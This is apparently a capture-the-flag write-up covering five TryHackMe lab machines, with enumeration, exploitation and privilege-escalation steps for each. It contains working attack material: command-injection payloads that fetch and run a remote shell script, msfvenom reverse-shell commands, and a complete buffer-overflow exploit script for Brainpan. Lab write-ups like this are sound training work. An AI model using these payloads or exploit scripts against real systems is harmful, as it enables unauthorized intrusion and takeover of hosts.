# Capstone Challenge

1. [Lazy Admin](#lazy-admin)
2. [Anonymous](#anonymous)
3. [Tomghost](#tomghost)
4. [ConvertMyVideo](#convertmyvideo)
5. [Brainpan1](#brainpan1)

## Lazy Admin

* We have two open ports - 22 and 80 - and we can begin by enumerating the webpage on port 80.

* The webpage is a default landing page for Apache; we can use ```feroxbuster``` to enumerate the directories, which gives us /content directory.

* The page is for SweetRice CMS; we can search for exploits for this on Exploit-DB.

* We can run directory brute-forcing tools for the /content page; we get a lot of directories in return as it is a CMS.

* One of the directories /content/inc/mysql_backup, contains a .sql backup file which contains the MD5 hash of an admin user 'manager'.

* The hash can be cracked using online services; and this gives us access to the admin dashboard of SweetRice.

* Now, we have an exploit on Exploit-DB, which helps us in uploading a shell file in the directory /content/attachment

* By modifying and running the Python script, we are able to add a .phtml reverse-shell to /content/attachment

* After setting up a listener and activating the shell, we get reverse-shell as 'www-data'.

* Using ```sudo -l```, we can see that we can run /usr/bin/perl for a particular Perl script as sudo.

* Inspecting the Perl script, we can see that it runs another .sh script in /etc

* By checking the file permissions, we can see that the script in /etc is editable by us, so we can edit it to launch a reverse-shell using the reverse-shell one-liner.

* After setting up another listener, we can run the command to execute the Perl script as sudo; we get shell as root on our listener.

## Anonymous

* FTP anonymous login is allowed, and we also have SMB shares that can be accessed.

* Logging into FTP, we have a scripts folder with a few files; we can transfer all files using ```mget```.

* Now, the clean.sh script in the scripts folder is writable by our user; so we can overwrite it by adding a reverse-shell one-liner.

* After setting up our listener, we can upload the modified clean.sh script to the scripts directory.

* In a minute, we get shell as 'namelessone'.

* Using the command ```find / -type f -perm -04000 -ls 2>/dev/null```, we can find files with SUID bit set.

* /usr/bin/env has SUID bit set, and there is an exploit for it on GTFObins.

* Following the exploit for 'env', we get root access.

## Tomghost

* Ports 22, 8009 and 8080 are open; the machine is using Apache Tomcat/9.0.30 on port 8080.

* On port 8009, we have Apache Jserv (protocol v1.3).

* We can Google the version numbers and check for exploits; we get results for the Ghostcat vulnerability.

* We get a script on Exploit-DB for the Ghostcat vulnerability.

* On running the Python script, we get the ```WEB-INF/web.xml``` file.

* The output includes the creds for the 'skyfuck' user; we can log into SSH using these creds.

* Checking the files, we have a .asc file and a .pgp file; we can transfer it to attacker machine using ```scp```.

* The passphrase for .pgp file can be found by decrypting the .asc file - we can do this using ```gpg2john``` to get a hash, and then cracking the hash using ```john```.

* This gives us the passphrase, which can be used to decrypt the .pgp file; this gives us creds for another user 'merlin'.

* We can log into SSH as 'merlin' this time.

* Checking for privesc, running ```sudo -l```, we can see that 'zip' can be run as sudo.

* Getting the exploit from GTFObins and running it, we get root access.

## ConvertMyVideo

* We have open ports 22 and 80; we can check the webpage first.

* The webpage on port 80 contains an input to accept 'video ID', which will then convert our video.

* We can check how the website works, and in background we can enumerate the web directories as well.

* We can try using any YouTube video ID as input, but we always get the error message on clicking 'Convert!'.

* Now, intercepting the request using Burp Suite, we can see that the 'yt_url' parameter includes URL-encoded YouTube link concatenated with the video ID (user input); this is a POST request.

* We can forward the POST request to Repeater and tweak it.

* When a random video ID is entered, like 'id' or 'ls', the error message mentions ```youtube-dl```

* However, if we enclose our input in backticks, such that the parameter yt_url=\`id\`, this shows the result of the command executed.

* Thus, by enclosing a command in our backticks and using that as the value of 'yt_url', we can execute commands remotely.

* Using the command 'ls' (enclosed in backticks) as an input for 'yt_url' and forwarding the POST request, we get the secret folder 'admin'.

* Now, commands with spaces do not work, so we can use the ```${IFS}``` separator instead of spaces to make the command work.

* Now, the command does not get executed if it contains symbols such as '+' or '-', so we can try to host a reverse-shell script, download it on victim machine, and get a reverse-shell on our listener.

* We will be executing the following commands using yt_url RCE (commands enclosed in backticks):

  ```shell
  which${IFS}wget

  wget${IFS}http://10.14.31.212:8000/shell.sh

  chmod${IFS}777${IFS}shell.sh

  bash${IFS}shell.sh
  ```

* This gives us a reverse-shell on our listener as ```www-data```; we can get user flag from the /admin folder.

* Now, we can check for enumeration using linpeas.sh; it does not give us a lot of clues.

* Now, checking the processes running (captured by linpeas), we can see that it is running 'cron', but we do not have any cronjobs listed.

* To monitor the processes running as root without root permissions, we can use the ```pspy``` tool, by transferring it from attacker to victim machine.

* We can run the ```pspy``` tool with the help flag and check what we can do to inspect processes and cronjobs.

* Running the tool, we get a list of processes running, and we can see that the following command is executed as a cronjob every minute:

  ```/bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh```

* So, we can attempt to overwrite ```clean.sh``` and escalate our privileges; but we have to get our reverse shell back first.

* Using Ctrl+C, we stop the process, and run the Burp Suite RCE again to get our reverse-shell back on listener.

* Now, we can edit ```clean.sh``` and add our reverse-shell one-liner.

* On our new listener, we get reverse-shell within a minute as root, and we can read the root flag.

## Brainpan1

* We have open ports 9999 and 10000; the former is running 'abyss' service and the latter is running SimpleHTTPServer

* We can interact with the service on port 9999 using ```netcat```, we can enter a password, and if incorrect the program 'brainpan' stops.

* Checking the webpage on port 10000, we have an infographic.

* Using ```feroxbuster```, we can scan for hidden directories; we get a /bin directory, which contains brainpan.exe

* Assuming this .exe is the same as the one used on port 9999, we can download this and transfer to our local Windows machine and attempt to reverse-engineer this.

* Using Immunity Debugger & ```mona```, we can check for [buffer overflow](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/TryHackMe/Rooms/BufferOverflowPrep.md#overflow1).

* In local Windows machine, run Immunity Debugger as Administrator, open brainpan.exe and run it.

* In the command box below, run the following ```mona``` command:

  ```!mona config -set workingfolder c:\mona\%p```

* In our Kali machine, we can prepare a fuzzer script:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.30.139"

port = 9999
timeout = 5

string = "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

* Running this script shows that the fuzzer crashes at 600 bytes; we need to create a pattern of 600 + 400 = 1000 bytes; this can be done with the help of ```pattern_create.rb```

* The generated output pattern has to be used as payload in the exploit script to be created:

```python
import socket

ip = "192.168.30.139"
port = 9999

offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
#insert pattern in payload
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

* Always restart the .exe in Immunity Debugger before running the exploit.

* Now, running the exploit script crashes the program, and we can get the EIP offset position with this command:

  ```!mona findmsp -distance 1000```

* This shows that the EIP offset is 524; we can now generate bytearray in ```mona```:

  ```!mona bytearray -b "\x00"```

* We need to generate a similar badchars array in Python, minus the nullbyte:

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

* Now, edit the exploit script such that the payload contains the badchars generated by Python script, the offset value is 524 and retn address is "BBBB".

* After running the exploit script now, we need to note the ESP register's address and include it as a parameter in the command:

  ```!mona compare -f C:\mona\brainpan\bytearray.bin -a 005FF910```

* Running this shows the mona comparison window with the message 'unmodified' - this means the only badchar is nullbtye \x00

* We can find jump point address now:

  ```!mona jmp -r esp -cpb "\x00"```

* This returns a single address (view Log Data window) - it shows the address 311712F3, with all properties set as ```False```, so we can use it.

* As we are dealing with x86 architecture, we have to use the little-endian system of address writing.

* So our jump point address would be "\xf3\x12\x17\x31"

* Now, we can generate shellcode with the help of ```msfvenom```:

  ```msfvenom -p windows/shell_reverse_tcp LHOST=10.14.31.212 LPORT=4444 EXITFUNC=thread -b "\x00" -f c```

* Edit exploit script such that the payload includes the generated shellcode (enclosed in brackets), retn includes jump point address and padding includes ```"\x90" * 16```.

* We can setup listener, restart the .exe and run the exploit again - this gives us reverse shell.

* We need to implement the same against the victim machine now, so replace IP to that of target machine, and generate shellcode again if required.

* Running the exploit this time gives us reverse shell as 'puck'.

* Enumerating our directories, it seems we are in a Linux environment, and the .exe could have been run using Windows.

* However, most of the Linux commands do not run and we get a 'file not found' error on running those commands.

* So, we have to regenerate our ```msfvenom``` shellcode for getting a Linux reverse shell:

  ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.14.31.212 LPORT=4444 EXITFUNC=thread -b "\x00" -f c```

* We can edit exploit script and add the new shellcode by replacing old one, and edit the IP address if required.

* Our final exploit script will look like this:

```python
import socket

ip = "10.10.250.254"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
#jump point address
padding = "\x90" * 16
payload = ();
#add shellcode for linux reverse shell in payload
postfix = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

* Setting up our listener on port 4444 again, and running the Python exploit script gives us reverse shell for the Linux environment this time.

* We have to upgrade our shell here in order to get full functionality.

* Checking ```sudo -l``` shows that we can run ```/home/anansi/bin/anansi_util``` as root without password.

* Running this command as sudo gives us 3 possible actions - network, proclist and manual.

* Using network and proclist shows us output for ```ipconfig``` and ```ps```, and manual, followed by any command, shows the ```man``` page for that command.

* Checking on ```GTFObins``` for exploits, we can see that ```man``` can be escaped by using ```!/bin/sh```, which spawns a shell from manual page.

* Using this command, we are able to get a root shell.
